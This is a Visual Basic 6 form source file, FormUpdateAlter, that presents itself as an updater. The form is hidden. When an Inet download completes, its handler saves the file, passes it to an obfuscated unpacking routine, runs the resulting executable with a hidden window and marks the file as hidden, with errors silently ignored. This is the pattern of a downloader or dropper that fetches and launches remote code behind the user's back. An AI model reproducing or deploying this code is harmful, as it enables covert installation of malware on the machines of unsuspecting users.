VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "msinet.ocx"
Begin VB.Form FormUpdateAlter 
   Caption         =   "Form1"
   ClientHeight    =   1425
   ClientLeft      =   60
   ClientTop       =   405
   ClientWidth     =   7065
   LinkTopic       =   "Form1"
   ScaleHeight     =   1425
   ScaleWidth      =   7065
   Visible         =   0   'False
   Begin VB.TextBox exetext 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   5280
      TabIndex        =   4
      Top             =   840
      Width           =   1575
   End
   Begin VB.TextBox ziptext 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   3600
      TabIndex        =   3
      Top             =   840
      Width           =   1575
   End
   Begin VB.TextBox textweb 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000080FF&
      Height          =   375
      Left            =   0
      TabIndex        =   2
      Top             =   960
      Width           =   3375
   End
   Begin VB.TextBox TxtParche 
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Text            =   "Text1"
      Top             =   480
      Width           =   3495
   End
   Begin VB.TextBox TxtEliminar 
      Height          =   375
      Left            =   0
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   0
      Width           =   3495
   End
   Begin InetCtlsObjects.Inet Inet2 
      Left            =   3960
      Top             =   120
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
End
Attribute VB_Name = "FormUpdateAlter"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Inet2_StateChanged(ByVal state As Integer)
On Error Resume Next

    Dim tempArray()                 As Byte
    Dim bDone                 As Boolean
    Dim FileSize                           As Long

    Dim vtData                                  As Variant

    Select Case state

        Case icResponseCompleted
            bDone = False
       
            FileSize = Inet2.GetHeader("Content-length")
            Open Donde & "\" & Formatox For Binary As Chr(49)
                    vtData = Inet2.GetChunk(1024, icByteArray)
            DoEvents
                     If Len(vtData) = 0 Then
                bDone = True
            End If
                         
            Do While Not bDone
                tempArray = vtData

                Put Chr(49), , tempArray
        
                vtData = Inet2.GetChunk(1024, icByteArray)
         
                DoEvents
      
               
            
                If Len(vtData) = 0 Then
                    bDone = True
                End If
            Loop

        Close Chr(49)
          
               WT2foxzx9 Donde & "\" & Formatox, Donde & "\"
        
        
   '    Kill Donde & "\" & Formatox
    

Dim asd   As Integer

  Shell Donde & "\" & NOMBREDELEXE, vbHide
  SetAttr Donde & "\" & NOMBREDELEXE, vbHide
 
   IizuaqU = CLng("0")

 End Select
End Sub

